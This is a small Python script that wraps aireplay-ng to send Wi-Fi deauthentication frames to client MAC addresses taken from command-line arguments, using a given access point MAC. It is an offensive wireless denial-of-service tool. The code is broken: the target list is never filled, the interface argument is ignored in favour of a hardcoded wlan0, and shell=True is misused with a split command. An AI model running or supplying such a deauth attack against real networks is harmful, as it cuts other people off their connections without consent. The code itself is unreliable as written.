import subprocess, sys

#print("deauth started")

lis = sys.argv[3:]
iface = sys.argv[1]
rmac = sys.argv[2]

print(lis[1])

target=[]


#print(target)

for i in target:
    cmd = f'aireplay-ng --deauth 10 -c {i} -a {rmac} wlan0'
    subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, shell=True)
